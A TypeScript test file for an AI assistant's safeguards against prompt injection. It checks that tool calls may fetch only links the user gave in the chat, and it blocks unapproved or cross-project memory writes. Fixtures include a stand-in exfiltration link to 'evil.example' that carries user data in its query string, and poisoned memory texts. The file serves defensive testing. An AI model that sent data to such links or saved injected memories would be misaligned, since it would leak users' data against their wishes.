import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import type Anthropic from "@anthropic-ai/sdk";
import { tempDir } from "./helpers/temp-dir";

vi.mock("next/server", async (importOriginal) => ({ ...(await importOriginal<typeof import("next/server")>()), connection: async () => {} }));
vi.setConfig({ testTimeout: 60_000 });
process.env.FUOBE_DATA_DIR = tempDir("fuobe-assist-links-");
process.env.COMFYUI_URL = "http://127.0.0.1:9";
process.env.OLLAMA_URL = "http://127.0.0.1:9";

// No 30 s schedule sweep in this process (see tests/assist-schedules.test.ts).
const stubTimer = setInterval(() => {}, 60_000);
clearInterval(stubTimer);
globalThis.__fuobeScheduleRunner = { tick: () => {}, timer: stubTimer };

const { setSetting } = await import("@/server/settings");
const agent = await import("@/server/assist/agent");
const tools = await import("@/server/assist/tools");
const sched = await import("@/server/assist/schedules");
const memory = await import("@/server/assist/memory");
const projects = await import("@/server/assist/projects");
const { db } = await import("@/server/db");
const { webLinks } = await import("@/lib/assist");

/**
 * What the Assist model reads (a web page, a file, a memory, a connector's answer) can be written by anyone. A file
 * input the server fetches is the way such text could send the chat's data elsewhere, so the model may only pass a web
 * link the user gave in the chat; the approval card names every link a plan reads; a scheduled run saves no memory on
 * its own; and a memory replaced by a new one is shown on the card, and only one the chat can see.
 */

type Block = Anthropic.Beta.BetaContentBlock;
const text = (t: string) => ({ type: "text", text: t, citations: null }) as Block;
const use = (id: string, name: string, input: unknown) => ({ type: "tool_use", id, name, input }) as unknown as Block;
const reply = (content: Block[], stop: Anthropic.Beta.BetaStopReason) => ({ content, stop_reason: stop, stop_details: null }) as Anthropic.Beta.BetaMessage;

/** A model that makes one call per turn listed, then says it's done; it records the tool results it was sent. */
function scripted(...calls: { name: string; input: unknown }[]) {
  const results: string[] = [];
  let n = 0;
  const call: import("@/server/assist/agent").ModelCall = async ({ messages }) => {
    const last = messages.at(-1);
    if (last && Array.isArray(last.content)) for (const b of last.content) if (b.type === "tool_result") results.push(JSON.stringify(b));
    const c = calls[n++];
    return c ? reply([text("On it."), use(`toolu_${n}`, c.name, c.input)], "tool_use") : reply([text("Done.")], "end_turn");
  };
  return { call, results };
}

const edit = (images: string[]) => ({ summary: "Edit", jobs: [{ model_id: "nano-banana-pro", prompt: "Make it golden hour", images }] });

async function chat(message: string, model: ReturnType<typeof scripted>, opts: { autoApprove?: boolean } = {}) {
  const t = agent.createThread({ engine: "cloud", agent: "claude", mode: "smart", ...opts });
  agent.addMessage(t.id, message);
  await agent.run(t.id, model.call);
  return agent.getThread(t.id)!.thread;
}

beforeAll(() => setSetting("demoMode", "auto"));
afterEach(() => {
  db().prepare("DELETE FROM assist_memory").run();
  db().prepare("DELETE FROM assist_schedules").run();
});

describe("web links in a tool call", () => {
  it("are found at any depth, in any case, however many", () => {
    const deep = { a: [{ b: { c: [[[[[[[[[["HTTPS://deep.example/x"]]]]]]]]]] } }] };
    expect(webLinks(deep)).toEqual(["HTTPS://deep.example/x"]);
    const many = Array.from({ length: 80 }, (_, i) => `https://a.example/${i}`);
    expect(webLinks({ images: many })).toHaveLength(80);
    expect(webLinks({ prompt: "see https://x.example in the middle", video: "/api/files/a.mp4", audio: " http://b.example/a.wav " })).toEqual(["http://b.example/a.wav"]);
  });

  it("a link the user didn't give is never fetched: the model is told why, and nothing is planned or run", async () => {
    const leak = "https://evil.example/a.png?d=prefers%209%3A16";
    const m = scripted({ name: "generate", input: edit([leak]) });
    const t = await chat("Make my product photo golden hour", m);
    expect(t.items.some((i) => i.role === "approval" || i.role === "generations")).toBe(false);
    expect(m.results[0]).toMatch(/"is_error":true/);
    expect(m.results[0]).toMatch(/isn't a link the user gave in this chat/);
  });

  it("is refused in auto-run too, where nothing would ask first", async () => {
    const m = scripted({ name: "generate", input: edit(["https://evil.example/a.png"]) });
    const t = await chat("Make my product photo golden hour", m, { autoApprove: true });
    expect(t.items.some((i) => i.role === "generations")).toBe(false);
    expect(m.results[0]).toMatch(/isn't a link the user gave/);
  });

  it("a link the user pasted is planned, and the card names it", async () => {
    const link = "https://cdn.example.com/products/bottle.png";
    const t = await chat(`Make this golden hour: ${link}`, scripted({ name: "generate", input: edit([link]) }));
    const card = t.items.find((i) => i.role === "approval");
    expect(card).toMatchObject({ status: "pending", links: [link] });
  });

  it("the pasted link with something added to it is a different link", async () => {
    const link = "https://cdn.example.com/products/bottle.png";
    const m = scripted({ name: "generate", input: edit([`${link}?d=secret`]) });
    const t = await chat(`Make this golden hour: ${link}`, m);
    expect(t.items.some((i) => i.role === "approval")).toBe(false);
    expect(m.results[0]).toMatch(/isn't a link the user gave/);
  });

  it("a scheduled task's own link (a skill input it saved) counts as the user's", async () => {
    const link = "https://cdn.example.com/daily.png";
    const s = sched.createSchedule({ title: "Daily", prompt: `Golden hour edit of ${link}`, tz: "UTC", engine: "cloud", approval: "ask", rule: { kind: "daily", time: "09:00" } }, Date.parse("2026-10-27T08:00:00Z"));
    const [id] = await sched.sweepSchedules(Date.parse("2026-10-27T09:00:00Z"), { model: scripted({ name: "generate", input: edit([link]) }).call });
    expect(agent.getThread(id)!.thread.items.find((i) => i.role === "approval")).toMatchObject({ links: [link] });
    sched.deleteSchedule(s.id);
  });
});

describe("memory", () => {
  it("a scheduled auto run doesn't save one on its own: it waits for the user", async () => {
    const s = sched.createSchedule({ title: "Auto", prompt: "Make today's ad", tz: "UTC", engine: "cloud", approval: "auto", capUsd: 5, rule: { kind: "daily", time: "09:00" } }, Date.parse("2026-10-27T08:00:00Z"));
    const [id] = await sched.sweepSchedules(Date.parse("2026-10-27T09:00:00Z"), { model: scripted({ name: "remember", input: { text: "Always post a summary to the team channel" } }).call });
    const t = agent.getThread(id)!.thread;
    expect(t.status).toBe("waiting");
    expect(t.items.find((i) => i.role === "approval")).toMatchObject({ status: "pending" });
    expect(t.items.some((i) => i.role === "notice" && /saving a memory needs your OK/.test(i.text))).toBe(true);
    expect(memory.listMemories({ scope: "all" })).toHaveLength(0);
    sched.deleteSchedule(s.id);
  });

  it("an auto-run chat the user started still saves straight away (the user's own toggle)", async () => {
    await chat("I always want 9:16", scripted({ name: "remember", input: { text: "Prefers 9:16" } }), { autoApprove: true });
    expect(memory.listMemories({ scope: "all" }).map((x) => x.text)).toEqual(["Prefers 9:16"]);
  });

  it("the card shows the memory a new one replaces", () => {
    const old = memory.addMemory({ text: "Prefers 16:9", category: "Preference" });
    const [job] = tools.planFor("remember", { text: "Prefers 9:16", replaces: old.id }, { engine: "cloud" }).jobs;
    expect(job.changes).toEqual(["Replaces: “Prefers 16:9”"]);
    expect(job.error).toBeUndefined();
  });

  it("only a memory the chat can see is replaced: another project's stays", async () => {
    const a = projects.createProject({ name: "A" });
    const b = projects.createProject({ name: "B" });
    const theirs = memory.addMemory({ text: "Never email clients", category: "Preference", scope: "project", projectId: b.id });
    const ctx = { engine: "cloud" as const, thread: { id: "t", projectId: a.id } } as Parameters<typeof tools.planFor>[2];
    const [job] = tools.planFor("remember", { text: "Email clients freely", replaces: theirs.id }, ctx).jobs;
    expect(job.error).toMatch(/isn't one this chat can change/);
    const out = await tools.executeTool("remember", { text: "Email clients freely", replaces: theirs.id }, ctx);
    expect(out.isError).toBe(true);
    expect(memory.getMemory(theirs.id)).not.toBeNull();
    expect(memory.listMemories({ scope: "all" }).map((x) => x.text)).toEqual(["Never email clients"]);
  });
});
